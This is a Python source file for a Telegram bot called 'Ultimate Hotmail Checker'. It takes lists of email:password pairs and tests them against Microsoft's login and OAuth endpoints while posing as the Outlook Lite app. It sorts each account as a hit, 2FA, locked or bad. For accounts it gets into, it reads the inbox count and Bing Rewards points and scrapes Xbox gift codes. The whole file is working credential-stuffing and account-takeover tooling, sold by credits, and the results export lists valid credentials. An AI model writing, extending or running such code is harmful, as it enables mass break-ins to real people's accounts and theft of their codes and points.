#!/usr/bin/env python3
"""
ULTIMATE HOTMAIL CHECKER BOT - Railway Ready
Combines: hit.py + p7.py + flux.py (Xbox codes) + h.py features
Features: Inbox, Rewards, Xbox Codes, Multi-threading, File Upload, Beautiful UI
"""

import re, json, uuid, sqlite3, logging, asyncio, time, io, os
from datetime import datetime
from dotenv import load_dotenv

load_dotenv()
from typing import Dict, List, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests, urllib3
urllib3.disable_warnings()

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from telegram.constants import ParseMode

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Bot Configuration
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
DB_FILE = "ultimate.db"

# Global stats
class Stats:
    def __init__(self):
        self.checked = 0
        self.hits = 0
        self.bad = 0
        self.twofa = 0
        self.locked = 0
        self.errors = 0
        self.start_time = time.time()
        self.lock = asyncio.Lock()
    
    async def increment(self, field):
        async with self.lock:
            setattr(self, field, getattr(self, field) + 1)
    
    def get_cpm(self):
        elapsed = time.time() - self.start_time
        return int((self.checked / elapsed) * 60) if elapsed > 0 else 0
    
    def reset(self):
        self.checked = self.hits = self.bad = self.twofa = self.locked = self.errors = 0
        self.start_time = time.time()

stats = Stats()

class Database:
    def __init__(self):
        conn = sqlite3.connect(DB_FILE)
        try:
            c = conn.cursor()
            c.execute('''CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
                has_access INTEGER DEFAULT 0, credits INTEGER DEFAULT 0,
                total_checks INTEGER DEFAULT 0, total_hits INTEGER DEFAULT 0,
                joined_date TEXT, is_banned INTEGER DEFAULT 0, threads INTEGER DEFAULT 1,
                check_inbox INTEGER DEFAULT 1, check_rewards INTEGER DEFAULT 0,
                check_xbox INTEGER DEFAULT 0, keywords TEXT DEFAULT '')''')
            c.execute('''CREATE TABLE IF NOT EXISTS results (
                id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, email TEXT,
                status TEXT, inbox_count INTEGER, rewards_points INTEGER,
                xbox_codes TEXT, date TEXT)''')
            conn.commit()
        finally:
            conn.close()
    
    def add_user(self, uid, uname, fname):
        conn = sqlite3.connect(DB_FILE)
        try:
            c = conn.cursor()
            c.execute('INSERT OR IGNORE INTO users (user_id, username, first_name, joined_date) VALUES (?, ?, ?, ?)',
                     (uid, uname or "", fname or "", datetime.now().isoformat()))
            conn.commit()
        finally:
            conn.close()
    
    def has_access(self, uid):
        if uid == ADMIN_ID: return True
        conn = sqlite3.connect(DB_FILE)
        try:
            c = conn.cursor()
            c.execute('SELECT has_access FROM users WHERE user_id = ?', (uid,))
            r = c.fetchone()
            return r and r[0] == 1
        finally:
            conn.close()
    
    def is_banned(self, uid):
        conn = sqlite3.connect(DB_FILE)
        try:
            c = conn.cursor()
            c.execute('SELECT is_banned FROM users WHERE user_id = ?', (uid,))
            r = c.fetchone()
            return r and r[0] == 1
        finally:
            conn.close()
    
    def grant(self, uid, creds=10):
        conn = sqlite3.connect(DB_FILE)
        try:
            c = conn.cursor()
            c.execute('''INSERT OR REPLACE INTO users 
                (user_id, username, first_name, has_access, credits, joined_date, total_checks, total_hits, is_banned, threads, check_inbox, check_rewards, check_xbox, keywords)
                VALUES (?, ?, ?, 1, ?, COALESCE((SELECT joined_date FROM users WHERE user_id = ?), ?),
                        COALESCE((SELECT total_checks FROM users WHERE user_id = ?), 0),
                        COALESCE((SELECT total_hits FROM users WHERE user_id = ?), 0), 0, 1, 1, 0, 0, '')''',
                     (uid, f"user_{uid}", f"User{uid}", creds, uid, datetime.now().isoformat(), uid, uid))
            conn.commit()
        finally:
            conn.close()
    
    def revoke(self, uid):
        conn = sqlite3.connect(DB_FILE)
        try:
            c = conn.cursor()
            c.execute('UPDATE users SET has_access = 0 WHERE user_id = ?', (uid,))
            conn.commit()
        finally:
            conn.close()
    
    def get_credits(self, uid):
        conn = sqlite3.connect(DB_FILE)
        try:
            c = conn.cursor()
            c.execute('SELECT credits FROM users WHERE user_id = ?', (uid,))
            r = c.fetchone()
            return r[0] if r else 0
        finally:
            conn.close()
    
    def add_credits(self, uid, amt):
        conn = sqlite3.connect(DB_FILE)
        try:
            c = conn.cursor()
            c.execute('UPDATE users SET credits = credits + ? WHERE user_id = ?', (amt, uid))
            conn.commit()
        finally:
            conn.close()
    
    def use_credit(self, uid):
        conn = sqlite3.connect(DB_FILE)
        try:
            c = conn.cursor()
            c.execute('UPDATE users SET credits = credits - 1 WHERE user_id = ?', (uid,))
            conn.commit()
        finally:
            conn.close()
    
    def get_settings(self, uid):
        conn = sqlite3.connect(DB_FILE)
        try:
            c = conn.cursor()
            c.execute('SELECT threads, check_inbox, check_rewards, check_xbox, keywords FROM users WHERE user_id = ?', (uid,))
            r = c.fetchone()
            if r:
                return {'threads': r[0], 'inbox': r[1], 'rewards': r[2], 'xbox': r[3], 'keywords': r[4]}
            return {'threads': 1, 'inbox': 1, 'rewards': 0, 'xbox': 0, 'keywords': ''}
        finally:
            conn.close()
    
    def update_settings(self, uid, **kwargs):
        conn = sqlite3.connect(DB_FILE)
        try:
            c = conn.cursor()
            for key, val in kwargs.items():
                if key in ['threads', 'check_inbox', 'check_rewards', 'check_xbox', 'keywords']:
                    c.execute(f'UPDATE users SET {key} = ? WHERE user_id = ?', (val, uid))
            conn.commit()
        finally:
            conn.close()
    
    def save_result(self, uid, email, status, inbox, points, codes):
        conn = sqlite3.connect(DB_FILE)
        try:
            c = conn.cursor()
            c.execute('INSERT INTO results (user_id, email, status, inbox_count, rewards_points, xbox_codes, date) VALUES (?, ?, ?, ?, ?, ?, ?)',
                     (uid, email, status, inbox, points, codes, datetime.now().isoformat()))
            if status == 'hit':
                c.execute('UPDATE users SET total_checks = total_checks + 1, total_hits = total_hits + 1 WHERE user_id = ?', (uid,))
            else:
                c.execute('UPDATE users SET total_checks = total_checks + 1 WHERE user_id = ?', (uid,))
            conn.commit()
        finally:
            conn.close()
    
    def get_users(self):
        conn = sqlite3.connect(DB_FILE)
        try:
            c = conn.cursor()
            c.execute('SELECT user_id, username, first_name, has_access, credits, total_checks FROM users LIMIT 20')
            return c.fetchall()
        finally:
            conn.close()
    
    def get_stats(self):
        conn = sqlite3.connect(DB_FILE)
        try:
            c = conn.cursor()
            c.execute('SELECT COUNT(*) FROM users')
            t = c.fetchone()[0]
            c.execute('SELECT COUNT(*) FROM users WHERE has_access = 1')
            a = c.fetchone()[0]
            c.execute('SELECT SUM(total_checks) FROM users')
            ch = c.fetchone()[0] or 0
            c.execute('SELECT SUM(total_hits) FROM users')
            h = c.fetchone()[0] or 0
            return {'total': t, 'active': a, 'checks': ch, 'hits': h}
        finally:
            conn.close()
    
    def user_stats(self, uid):
        conn = sqlite3.connect(DB_FILE)
        try:
            c = conn.cursor()
            c.execute('SELECT total_checks, total_hits FROM users WHERE user_id = ?', (uid,))
            r = c.fetchone()
            return {'checks': r[0], 'hits': r[1]} if r else {'checks': 0, 'hits': 0}
        finally:
            conn.close()

class Checker:
    """Ultimate checker with hit.py flow + rewards + Xbox codes"""
    def __init__(self, check_inbox=True, check_rewards=False, check_xbox=False, keywords=""):
        self.s = requests.Session()
        self.s.verify = False
        self.s.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        self.uuid = str(uuid.uuid4())
        self.check_inbox = check_inbox
        self.check_rewards = check_rewards
        self.check_xbox = check_xbox
        self.keywords = [k.strip() for k in keywords.split(',') if k.strip()] if keywords else []
    
    def check(self, email, pwd):
        r = {'email': email, 'status': 'error', 'inbox': 0, 'points': 0, 'codes': ''}
        try:
            # Step 1: IDP check
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            h1 = {"X-OneAuth-AppName": "Outlook Lite", "X-Office-Version": "3.11.0-minApi24", "X-CorrelationId": self.uuid,
                  "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                  "Host": "odc.officeapps.live.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip"}
            r1 = self.s.get(url1, headers=h1, timeout=15)
            if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]) or "MSAccount" not in r1.text:
                r['status'] = 'bad'
                return r
            time.sleep(0.3)
            
            # Step 2: OAuth
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            h2 = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                  "Accept-Language": "en-US,en;q=0.9", "Connection": "keep-alive"}
            r2 = self.s.get(url2, headers=h2, allow_redirects=True, timeout=15)
            
            # Step 3: Extract
            url_m = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_m = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_m or not ppft_m:
                r['status'] = 'bad'
                return r
            post_url = url_m.group(1).replace("\\/", "/")
            ppft = ppft_m.group(1)
            
            # Step 4: Login
            data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={pwd}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            h3 = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Origin": "https://login.live.com", "Referer": r2.url}
            r3 = self.s.post(post_url, data=data, headers=h3, allow_redirects=False, timeout=15)
            
            # Step 5: Check
            txt = r3.text.lower()
            if "account or password is incorrect" in txt or r3.text.count("error") > 0:
                r['status'] = 'bad'
                return r
            if "identity/confirm" in txt or "consent" in txt:
                r['status'] = '2fa'
                return r
            if "abuse" in txt:
                r['status'] = 'locked'
                return r
            
            # Step 6: Get code
            loc = r3.headers.get("Location", "")
            if not loc:
                r['status'] = 'bad'
                return r
            code_m = re.search(r'code=([^&]+)', loc)
            if not code_m:
                r['status'] = 'bad'
                return r
            code = code_m.group(1)
            cid = self.s.cookies.get("MSPCID", "")
            if not cid:
                r['status'] = 'bad'
                return r
            cid = cid.upper()
            
            # Step 7: Token
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            r4 = self.s.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data,
                           headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15)
            if "access_token" not in r4.text:
                r['status'] = 'bad'
                return r
            token = r4.json()["access_token"]
            r['status'] = 'hit'
            
            # Step 8: Inbox (if enabled)
            if self.check_inbox:
                try:
                    h5 = {"Host": "outlook.live.com", "content-length": "0", "x-owa-sessionid": str(uuid.uuid4()),
                          "x-req-source": "Mini", "authorization": f"Bearer {token}",
                          "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36",
                          "action": "StartupData", "content-type": "application/json"}
                    r5 = self.s.post(f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0",
                                   data="", headers=h5, timeout=20)
                    if r5.status_code == 200 and '"Inbox":' in r5.text:
                        m = re.search(r'"Inbox":\s*\[\s*{\s*"TotalCount":\s*(\d+)', r5.text)
                        if m: r['inbox'] = int(m.group(1))
                except:
                    pass
            
            # Step 9: Rewards (if enabled)
            if self.check_rewards:
                try:
                    h6 = {"Authorization": f"Bearer {token}", "User-Agent": "Mozilla/5.0"}
                    r6 = self.s.get("https://rewards.bing.com/api/getuserinfo", headers=h6, timeout=10)
                    if r6.status_code == 200:
                        r['points'] = r6.json().get('availablePoints', 0)
                except:
                    pass
            
            # Step 10: Xbox codes (if enabled)
            if self.check_xbox:
                try:
                    codes_list = []
                    # Check order history for Xbox codes
                    orders_url = "https://account.microsoft.com/billing/orders"
                    r7 = self.s.get(orders_url, headers={"Authorization": f"Bearer {token}"}, timeout=15)
                    if r7.status_code == 200:
                        # Extract codes using regex
                        code_pattern = re.compile(r"\b[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}\b")
                        codes = code_pattern.findall(r7.text)
                        codes_list.extend(codes[:5])  # Limit to 5 codes
                    if codes_list:
                        r['codes'] = ', '.join(codes_list)
                except:
                    pass
            
            return r
        except:
            r['status'] = 'error'
            return r

db = Database()

# Bot handlers
async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
    user = u.effective_user
    db.add_user(user.id, user.username, user.first_name)
    if db.is_banned(user.id):
        await u.message.reply_text("❌ You are banned")
        return
    
    if user.id == ADMIN_ID:
        t = ("🔥 *ULTIMATE CHECKER BOT - ADMIN*\n\n"
             "Commands:\n"
             "• /admin - Admin panel\n"
             "• /check - Check accounts\n"
             "• /settings - Configure checker\n"
             "• /stats - View statistics\n"
             "• /help - Help")
    elif db.has_access(user.id):
        cr = db.get_credits(user.id)
        t = (f"✅ *ULTIMATE CHECKER BOT*\n\n"
             f"💰 Credits: `{cr}`\n\n"
             f"Commands:\n"
             f"• /check - Check accounts\n"
             f"• /settings - Configure\n"
             f"• /stats - Statistics\n"
             f"• /help - Help")
    else:
        t = "🔒 *Access Required*\n\nContact admin for access"
    
    await u.message.reply_text(t, parse_mode=ParseMode.MARKDOWN)

async def help_cmd(u: Update, c: ContextTypes.DEFAULT_TYPE):
    t = ("📖 *HELP MENU*\n\n"
         "*Commands:*\n"
         "• /start - Start bot\n"
         "• /check - Check accounts\n"
         "• /settings - Configure checker\n"
         "• /stats - View stats\n"
         "• /help - This menu\n\n"
         "*Format:*\n"
         "`email:password`\n\n"
         "*Features:*\n"
         "✅ Inbox counter\n"
         "✅ Rewards points\n"
         "✅ Xbox code fetcher\n"
         "✅ Multi-threading (1-5)\n"
         "✅ Keyword search\n"
         "✅ File upload (.txt)\n"
         "✅ Results export (.txt)")
    await u.message.reply_text(t, parse_mode=ParseMode.MARKDOWN)

async def admin(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if u.effective_user.id != ADMIN_ID:
        await u.message.reply_text("❌ Admin only")
        return
    s = db.get_stats()
    t = (f"👑 *ADMIN PANEL*\n\n"
         f"📊 *Statistics:*\n"
         f"• Users: `{s['total']}`\n"
         f"• Active: `{s['active']}`\n"
         f"• Checks: `{s['checks']}`\n"
         f"• Hits: `{s['hits']}`")
    kb = [
        [InlineKeyboardButton("➕ Grant", callback_data="grant"),
         InlineKeyboardButton("➖ Revoke", callback_data="revoke")],
        [InlineKeyboardButton("💰 Credits", callback_data="creds"),
         InlineKeyboardButton("👥 Users", callback_data="users")]
    ]
    await u.message.reply_text(t, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(kb))

async def settings(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if db.is_banned(uid):
        await u.message.reply_text("❌ Banned")
        return
    if not db.has_access(uid):
        await u.message.reply_text("❌ No access")
        return
    
    s = db.get_settings(uid)
    t = (f"⚙️ *SETTINGS*\n\n"
         f"🧵 Threads: `{s['threads']}`\n"
         f"📧 Inbox: `{'✅' if s['inbox'] else '❌'}`\n"
         f"🎁 Rewards: `{'✅' if s['rewards'] else '❌'}`\n"
         f"🎮 Xbox: `{'✅' if s['xbox'] else '❌'}`\n"
         f"🔍 Keywords: `{s['keywords'] or 'None'}`\n\n"
         f"*Configure:*")
    kb = [
        [InlineKeyboardButton("🧵 Threads", callback_data="set_threads"),
         InlineKeyboardButton("📧 Inbox", callback_data="set_inbox")],
        [InlineKeyboardButton("🎁 Rewards", callback_data="set_rewards"),
         InlineKeyboardButton("🎮 Xbox", callback_data="set_xbox")],
        [InlineKeyboardButton("🔍 Keywords", callback_data="set_keywords")]
    ]
    await u.message.reply_text(t, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(kb))

async def stats_cmd(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if db.is_banned(uid):
        await u.message.reply_text("❌ Banned")
        return
    cr = db.get_credits(uid)
    s = db.user_stats(uid)
    cpm = stats.get_cpm()
    t = (f"📊 *YOUR STATISTICS*\n\n"
         f"💰 Credits: `{cr}`\n"
         f"✅ Total Checks: `{s['checks']}`\n"
         f"💎 Total Hits: `{s['hits']}`\n"
         f"⚡ Current CPM: `{cpm}`\n\n"
         f"*Session Stats:*\n"
         f"Checked: `{stats.checked}`\n"
         f"Hits: `{stats.hits}`\n"
         f"Bad: `{stats.bad}`\n"
         f"2FA: `{stats.twofa}`\n"
         f"Locked: `{stats.locked}`\n"
         f"Errors: `{stats.errors}`")
    await u.message.reply_text(t, parse_mode=ParseMode.MARKDOWN)

async def check(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if db.is_banned(uid):
        await u.message.reply_text("❌ Banned")
        return
    if not db.has_access(uid):
        c.user_data['w'] = False
        await u.message.reply_text("❌ No access")
        return
    if uid != ADMIN_ID and db.get_credits(uid) <= 0:
        c.user_data['w'] = False
        await u.message.reply_text("❌ No credits")
        return
    
    t = ("🔍 *CHECKER*\n\n"
         "*Send accounts:*\n"
         "`email:password`\n\n"
         "*Or upload .txt file*")
    await u.message.reply_text(t, parse_mode=ParseMode.MARKDOWN)
    c.user_data['w'] = True

async def handle_file(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if not c.user_data.get('w'):
        return
    uid = u.effective_user.id
    if db.is_banned(uid) or not db.has_access(uid):
        c.user_data['w'] = False
        await u.message.reply_text("❌ Access denied")
        return
    
    file = await u.message.document.get_file()
    content = await file.download_as_bytearray()
    txt = content.decode('utf-8', errors='ignore')
    lines = [l.strip() for l in txt.split('\n') if ':' in l]
    
    if not lines:
        await u.message.reply_text("❌ No valid accounts in file")
        return
    
    accs = []
    for l in lines[:100]:  # Limit to 100
        try:
            e, p = l.split(':', 1)
            accs.append((e.strip(), p.strip()))
        except:
            continue
    
    if not accs:
        await u.message.reply_text("❌ No valid accounts")
        return
    
    c.user_data['pending_accs'] = accs
    await u.message.reply_text(f"📝 Loaded {len(accs)} accounts\n\nSend /start_check to begin")

async def handle_accounts(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if not c.user_data.get('w'):
        return
    uid = u.effective_user.id
    if db.is_banned(uid) or not db.has_access(uid):
        c.user_data['w'] = False
        await u.message.reply_text("❌ Denied")
        return
    
    txt = u.message.text
    lines = [l.strip() for l in txt.split('\n') if ':' in l]
    if not lines:
        c.user_data['w'] = False
        await u.message.reply_text("❌ Invalid format")
        return
    
    accs = []
    for l in lines[:100]:
        try:
            e, p = l.split(':', 1)
            accs.append((e.strip(), p.strip()))
        except:
            continue
    
    if not accs:
        c.user_data['w'] = False
        await u.message.reply_text("❌ No valid accounts")
        return
    
    if uid != ADMIN_ID:
        cr = db.get_credits(uid)
        if cr < len(accs):
            c.user_data['w'] = False
            await u.message.reply_text(f"❌ Need {len(accs)}, have {cr}")
            return
    
    c.user_data['w'] = False
    await process_accounts(u, c, accs, uid)

async def process_accounts(u, c, accs, uid):
    """Process accounts with multi-threading"""
    settings = db.get_settings(uid)
    threads = min(settings['threads'], 5)
    
    stats.reset()
    await u.message.reply_text(f"🚀 Starting check with {threads} threads...")
    
    results_file = io.StringIO()
    results_file.write(f"=== CHECKER RESULTS ===\n")
    results_file.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    results_file.write(f"Total: {len(accs)}\n\n")
    
    # Create progress message
    progress_msg = await u.message.reply_text("📊 *Progress: 0%*\nChecked: 0\nCPM: 0", parse_mode=ParseMode.MARKDOWN)
    
    def sync_check(email, pwd):
        """Synchronous check logic to run in executor"""
        checker = Checker(settings['inbox'], settings['rewards'], settings['xbox'], settings['keywords'])
        res = checker.check(email, pwd)
        db.save_result(uid, email, res['status'], res['inbox'], res['points'], res['codes'])
        return res

    async def check_account(executor, loop, email, pwd):
        await stats.increment('checked')
        # Run the blocking sync_check in the thread pool
        res = await loop.run_in_executor(executor, sync_check, email, pwd)
        
        if res['status'] == 'hit':
            await stats.increment('hits')
            if uid != ADMIN_ID:
                db.use_credit(uid)
            line = f"✅ HIT - {email}:{pwd}\n"
            if res['inbox']: line += f"   📧 Inbox: {res['inbox']}\n"
            if res['points']: line += f"   🎁 Points: {res['points']}\n"
            if res['codes']: line += f"   🎮 Codes: {res['codes']}\n"
            results_file.write(line + "\n")
        elif res['status'] == '2fa':
            await stats.increment('twofa')
            results_file.write(f"🔐 2FA - {email}:{pwd}\n\n")
        elif res['status'] == 'bad':
            await stats.increment('bad')
            results_file.write(f"❌ BAD - {email}:{pwd}\n\n")
        elif res['status'] == 'locked':
            await stats.increment('locked')
            results_file.write(f"🔒 LOCKED - {email}:{pwd}\n\n")
        else:
            await stats.increment('errors')
            results_file.write(f"⚠️ ERROR - {email}:{pwd}\n\n")
        
        # Update progress every 5 checks
        if stats.checked % 5 == 0:
            progress = int((stats.checked / len(accs)) * 100)
            cpm = stats.get_cpm()
            try:
                await progress_msg.edit_text(
                    f"📊 *Progress: {progress}%*\n"
                    f"Checked: {stats.checked}/{len(accs)}\n"
                    f"⚡ CPM: {cpm}\n"
                    f"✅ Hits: {stats.hits}\n"
                    f"❌ Bad: {stats.bad}\n"
                    f"🔐 2FA: {stats.twofa}",
                    parse_mode=ParseMode.MARKDOWN
                )
            except:
                pass
    
    # Process with threading
    loop = asyncio.get_running_loop()
    with ThreadPoolExecutor(max_workers=threads) as executor:
        tasks = [check_account(executor, loop, acc[0], acc[1]) for acc in accs]
        await asyncio.gather(*tasks)
    
    # Final update
    await progress_msg.edit_text(
        f"✅ *COMPLETE*\n\n"
        f"Checked: {stats.checked}\n"
        f"⚡ CPM: {stats.get_cpm()}\n\n"
        f"✅ Hits: {stats.hits}\n"
        f"❌ Bad: {stats.bad}\n"
        f"🔐 2FA: {stats.twofa}\n"
        f"🔒 Locked: {stats.locked}\n"
        f"⚠️ Errors: {stats.errors}",
        parse_mode=ParseMode.MARKDOWN
    )
    
    # Send results file
    results_file.write(f"\n=== SUMMARY ===\n")
    results_file.write(f"Hits: {stats.hits}\n")
    results_file.write(f"Bad: {stats.bad}\n")
    results_file.write(f"2FA: {stats.twofa}\n")
    results_file.write(f"Locked: {stats.locked}\n")
    results_file.write(f"Errors: {stats.errors}\n")
    results_file.write(f"CPM: {stats.get_cpm()}\n")
    
    results_file.seek(0)
    filename = f"results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    await u.message.reply_document(
        document=InputFile(io.BytesIO(results_file.read().encode()), filename=filename),
        caption="📁 Results file"
    )

async def button(u: Update, c: ContextTypes.DEFAULT_TYPE):
    q = u.callback_query
    await q.answer()
    uid = q.from_user.id
    
    if q.data == "users" and uid == ADMIN_ID:
        users = db.get_users()
        t = "👥 *USERS:*\n\n"
        for u_id, un, fn, acc, cr, ch in users:
            t += f"{'✅' if acc else '❌'} `{u_id}` - {fn}\n   Cr: {cr} | Ch: {ch}\n\n"
        if len(t) > 4000: t = t[:4000] + "\n..."
        await q.message.reply_text(t, parse_mode=ParseMode.MARKDOWN)
    
    elif q.data == "grant" and uid == ADMIN_ID:
        await q.message.reply_text("➕ *GRANT*\n\n`!grant USER_ID CREDITS`\nEx: `!grant 123 10`", parse_mode=ParseMode.MARKDOWN)
        c.user_data['a'] = 'grant'
    
    elif q.data == "revoke" and uid == ADMIN_ID:
        await q.message.reply_text("➖ *REVOKE*\n\n`!revoke USER_ID`\nEx: `!revoke 123`", parse_mode=ParseMode.MARKDOWN)
        c.user_data['a'] = 'revoke'
    
    elif q.data == "creds" and uid == ADMIN_ID:
        await q.message.reply_text("💰 *CREDITS*\n\n`!credits USER_ID AMT`\nEx: `!credits 123 5`", parse_mode=ParseMode.MARKDOWN)
        c.user_data['a'] = 'credits'
    
    elif q.data == "set_threads":
        await q.message.reply_text("🧵 *SET THREADS*\n\nSend: `!threads NUMBER`\nEx: `!threads 3`\nMax: 5", parse_mode=ParseMode.MARKDOWN)
        c.user_data['s'] = 'threads'
    
    elif q.data == "set_inbox":
        s = db.get_settings(uid)
        new_val = 0 if s['inbox'] else 1
        db.update_settings(uid, check_inbox=new_val)
        await q.message.reply_text(f"📧 Inbox: `{'✅ Enabled' if new_val else '❌ Disabled'}`", parse_mode=ParseMode.MARKDOWN)
    
    elif q.data == "set_rewards":
        s = db.get_settings(uid)
        new_val = 0 if s['rewards'] else 1
        db.update_settings(uid, check_rewards=new_val)
        await q.message.reply_text(f"🎁 Rewards: `{'✅ Enabled' if new_val else '❌ Disabled'}`", parse_mode=ParseMode.MARKDOWN)
    
    elif q.data == "set_xbox":
        s = db.get_settings(uid)
        new_val = 0 if s['xbox'] else 1
        db.update_settings(uid, check_xbox=new_val)
        await q.message.reply_text(f"🎮 Xbox: `{'✅ Enabled' if new_val else '❌ Disabled'}`", parse_mode=ParseMode.MARKDOWN)
    
    elif q.data == "set_keywords":
        await q.message.reply_text("🔍 *SET KEYWORDS*\n\nSend: `!keywords word1,word2`\nEx: `!keywords amazon,paypal`", parse_mode=ParseMode.MARKDOWN)
        c.user_data['s'] = 'keywords'

async def admin_cmd(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if u.effective_user.id != ADMIN_ID or not u.message.text.startswith('!'):
        return
    txt = u.message.text.strip()
    act = c.user_data.get('a')
    if not act:
        return
    try:
        p = txt.split()
        if act == 'grant' and len(p) >= 2:
            uid = int(p[1])
            cr = int(p[2]) if len(p) > 2 else 10
            db.grant(uid, cr)
            await u.message.reply_text(f"✅ Granted {uid}")
            c.user_data['a'] = None
        elif act == 'revoke' and len(p) >= 2:
            uid = int(p[1])
            db.revoke(uid)
            await u.message.reply_text(f"✅ Revoked {uid}")
            c.user_data['a'] = None
        elif act == 'credits' and len(p) >= 3:
            uid = int(p[1])
            amt = int(p[2])
            db.add_credits(uid, amt)
            await u.message.reply_text(f"✅ Added {amt} to {uid}")
            c.user_data['a'] = None
    except Exception as e:
        await u.message.reply_text(f"❌ Error: {e}")

async def settings_cmd(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if not u.message.text.startswith('!'):
        return
    txt = u.message.text.strip()
    act = c.user_data.get('s')
    if not act:
        return
    uid = u.effective_user.id
    try:
        p = txt.split()
        if act == 'threads' and len(p) >= 2:
            num = int(p[1])
            if 1 <= num <= 5:
                db.update_settings(uid, threads=num)
                await u.message.reply_text(f"✅ Threads set to {num}")
            else:
                await u.message.reply_text("❌ Must be 1-5")
            c.user_data['s'] = None
        elif act == 'keywords':
            keywords = txt.replace('!keywords', '').strip()
            db.update_settings(uid, keywords=keywords)
            await u.message.reply_text(f"✅ Keywords: {keywords}")
            c.user_data['s'] = None
    except Exception as e:
        await u.message.reply_text(f"❌ Error: {e}")

def main():
    logger.info("🚀 Ultimate Checker Bot Starting...")
    if not BOT_TOKEN:
        logger.error("❌ BOT_TOKEN not set!")
        return
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("admin", admin))
    app.add_handler(CommandHandler("check", check))
    app.add_handler(CommandHandler("settings", settings))
    app.add_handler(CommandHandler("stats", stats_cmd))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.Regex(r'^!'), admin_cmd), group=1)
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.Regex(r'^!'), settings_cmd), group=2)
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & ~filters.Regex(r'^!'), handle_accounts))
    
    logger.info("✅ Bot Running!")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
